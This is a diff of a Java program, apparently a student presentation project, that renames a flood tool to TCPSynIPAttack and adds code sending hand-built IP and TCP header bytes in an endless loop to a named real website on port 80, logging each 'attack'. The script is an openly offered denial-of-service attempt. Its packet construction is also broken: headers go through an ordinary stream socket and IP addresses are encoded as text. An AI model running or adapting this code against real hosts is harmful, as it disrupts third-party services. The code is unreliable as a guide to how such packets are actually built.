@@ -1,3 +1,16 @@
+/*
+
+David Jensen, Presentation project. This program is designed to use both TCP and IP vulnerabilities 
+
+
+*/
+
+
+
+
+
+
+
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -8,15 +21,19 @@ import java.net.SocketException;
 import java.nio.ByteBuffer;
 import java.util.Date;
 import java.util.Scanner;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
 
 
 
-class APflood {
+class TCPSynIPAttack {
 
   public static void main(String[] args) {
 
+  	//declairing both the TCP, IP and special character variables
+
     boolean et = true;
-    int count = 1000;
+    int count = 0;
     String characters = "!BBHHHBBH4s4s";
     String newCharacters = "HHLLBBHHH";
     String source_ip = "10.1.10.1";
@@ -43,16 +60,23 @@ class APflood {
 	int tcp_check = 0;
 	int tcp_urg_ptr = 0; 
     int ip_ver = 4;
+    int tcp_syn =0;
+    int tcp_fin = 0;
     int placeholder = 0;
     Socket socket = null;
+    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyy");
+    LocalDateTime now = LocalDateTime.now();
+    //long currentTime = System.currentTimeSec();
     
+    
+
     byte[] source_ipBytes = source_ip.getBytes();
     byte[] destination_ipBytes = dest_ip.getBytes();
 
     int ip_ihl_ver = (ip_ver << 4) + ip_ihl;
 
 
-
+    //connect to the socket and port of the desired website
 
 	try {
 	 socket = new Socket("frechetta.me", 80); 
@@ -62,6 +86,8 @@ class APflood {
 	} 
 	System.out.println("Success"); 
 	ByteBuffer buf = ByteBuffer.allocate(1024);
+
+	//
 
 
 	buf.put(charactersBytes);
@@ -80,6 +106,8 @@ class APflood {
 	byte[] arr = new byte[buf.remaining()];
 	buf.get(arr);
 		
+
+		// this is going to now push TCP
 	System.out.println("IP Size is: " + size); 
 
 	try {
@@ -95,7 +123,7 @@ class APflood {
 
 
 	int tcp_offset_res = (tcp_doff << 4);
-	//int tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5);
+	int tcp_flags = (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5) + tcp_fin;
 
 
 	newbuf.put(charBytes);
@@ -104,7 +132,7 @@ class APflood {
 	newbuf.putInt(tcp_seq);
 	newbuf.putInt(tcp_ack_seq);
 	newbuf.putInt(tcp_offset_res);
-	//newbuf.putInt(tcp_flags);
+	newbuf.putInt(tcp_flags);
 	newbuf.putInt(tcp_window);
 	newbuf.putInt(tcp_check);
 	newbuf.putInt(tcp_urg_ptr);
@@ -118,31 +146,40 @@ class APflood {
 	System.out.println("TCP Size is: " + thisSize); 
 
 
-	
+	//after completeing the IP flood, now this is going to complete the TCP flood
 
 	while (true) { 
+
 		
 		try (DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream()))
 		{ 
 			while (et != false) {
 			outToServer.write(arr, 0, size);
-			System.out.println("Sent");
+			outToServer.write(newArr, 0, thisSize);
+			while (count != 1000) {
+			System.out.println( "\nTime of Attack: " + dtf.format(now) + " "+ java.time.LocalTime.now() + "\nAttack number:" + count + "\nIP:" + count + " \nTCP:" + count);
+			//System.out.println("TCP sent attack number: " + newArr);
+
+			++ count;
+		}
+		
 		}
 			
 			} catch (IOException ee) { 
-				System.out.println("error sending");
+				System.out.println("Attack complete: " + dtf.format(now) + " "+ java.time.LocalTime.now());
 			} 
-			
+			et = false;
 			break;
 			} try { 
 				socket.close(); 
 			} catch (IOException ee) { 
-				et = false;
-				System.out.println("Sorry, error closing socket. Try again");
+				
+				System.out.println("socket closed");
+				System.exit(0);
 			}
 		}
 	}
-
+	
 
 
 
